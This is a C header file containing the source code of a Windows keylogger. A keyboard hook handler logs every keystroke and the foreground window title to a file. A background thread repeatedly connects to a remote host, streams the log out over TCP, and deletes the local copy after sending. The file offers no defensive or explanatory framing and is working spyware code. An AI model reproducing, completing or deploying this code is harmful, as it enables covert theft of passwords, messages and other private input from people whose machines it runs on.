#ifndef _KEYSAV_
#define _KEYSAV_

#ifndef TIMEOUT
#define TIMEOUT 10000
#endif
#ifndef TMPPATH
#define TMPPATH "C:\\Windows\\Temp\\TMP_4420.tmp"
#endif 

#include <Windows.h>
#include <stdio.h>
#include "VkConverters.h"
#include "client.h"

#pragma comment(lib, "Ws2_32.lib")

HANDLE LOGFILEMUTEX;

//log key pressed and foreground window
void logKey(LPARAM lParam, char *logPath){

	KBDLLHOOKSTRUCT *msgData = (KBDLLHOOKSTRUCT*)lParam;

	static HWND oldWindow = NULL;
	char windowTitle[1024];
	HWND currWindow;

	WaitForSingleObject(LOGFILEMUTEX, INFINITE);
	FILE *logFile = fopen(logPath, "a");

	//check the window we are using
	currWindow = GetForegroundWindow();
	if (currWindow != oldWindow) {

		GetWindowTextA(currWindow, windowTitle, 1024);
		fprintf(logFile, "\n\n[!] --- Current Window: %s --- [!]\n\n", windowTitle);

		oldWindow = currWindow;
	}
	//and log the keystroke
	if (msgData->vkCode) {
		fwprintf(logFile, L"%s", vkConvert(msgData->vkCode, msgData->scanCode));
	}

	fclose(logFile);
	ReleaseMutex(LOGFILEMUTEX);
}

//constantly check for a connection and if connected, send the data saved on the logfile
DWORD WINAPI remoteSender(void *lParam){

	DESTINFO *dest = (DESTINFO*)lParam;
	char *line, data[2048];
	FILE *log, *tmp;
	int r;

	CLIENT client = clientInit(dest->host, dest->port, AF_INET, SOCK_STREAM, IPPROTO_TCP);
	LOGFILEMUTEX = CreateMutex(NULL, FALSE, NULL);

	while (1){
		if (!client.isConnected){
			r = clientConnect(&client);
			if (r){
				clientClose(&client);
				continue;
			}
		}
		else{
			log = fopen(dest->logPath, "r");
			if (log == NULL){
				Sleep(1000);
				continue;
			}
			while (!feof(log)){
				line = fgets(data, 2048, log);
				if (line == NULL){
					break;
				}
				r = clientSend(&client, data, strlen(data));
				//if while sending we lose connection, delete the sent data and save the remaining
				if (r){
					//save unsended data
					tmp = fopen(TMPPATH, "w");
					while (!feof(log)){

						line = fgets(data, 2048, log);
						fprintf(tmp, "%s", data);
					}
					fclose(log);
					fclose(tmp);
					
					//update log file
					WaitForSingleObject(LOGFILEMUTEX, INFINITE);
					log = fopen(dest->logPath, "w");
					tmp = fopen(TMPPATH, "r");
					while (!feof(tmp)){

						fgets(data, 2048, tmp);
						fprintf(log, "%s", data);
					}
					fclose(log);
					fclose(tmp);
					remove(TMPPATH);

					ReleaseMutex(LOGFILEMUTEX);
				}
			}
			fclose(log);
			//check if everthing went fine and reset log
			if (client.isConnected){
				WaitForSingleObject(LOGFILEMUTEX, INFINITE);
				DeleteFileA(dest->logPath);
				ReleaseMutex(LOGFILEMUTEX);
			}
		}
	}

	return 0;
}

#endif
